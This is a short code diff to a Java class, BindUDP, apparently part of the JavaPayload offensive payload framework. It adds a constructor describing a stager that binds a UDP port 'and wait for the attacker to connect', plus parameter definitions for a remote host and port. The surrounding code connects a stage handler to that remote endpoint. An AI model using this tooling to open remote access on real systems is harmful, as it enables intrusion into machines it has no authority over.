@@ -38,9 +38,22 @@ import java.io.PrintStream;
 import java.net.DatagramSocket;
 import java.net.InetAddress;
 
+import javapayload.Parameter;
 import javapayload.handler.stage.StageHandler;
 
 public class BindUDP extends StagerHandler {
+	
+	public BindUDP() {
+		super("Bind on a UDP port", true, true, "Bind on a local UDP port and wait for the attacker to connect.");
+	};
+	
+	public Parameter[] getParameters() {
+		return new Parameter[] {
+				new Parameter("RHOST", false, Parameter.TYPE_HOST, "Remote host to connect to"),
+				new Parameter("RPORT", false, Parameter.TYPE_PORT, "Remote port to connect to")
+		};
+	}
+	
 	protected void handle(StageHandler stageHandler, String[] parameters, PrintStream errorStream, Object extraArg, StagerHandler readyHandler) throws Exception {
 		if (readyHandler != null) readyHandler.notifyReady();
 		ReverseUDP.handle(stageHandler, parameters, new DatagramSocket(), InetAddress.getByName(parameters[1]), Integer.parseInt(parameters[2]));
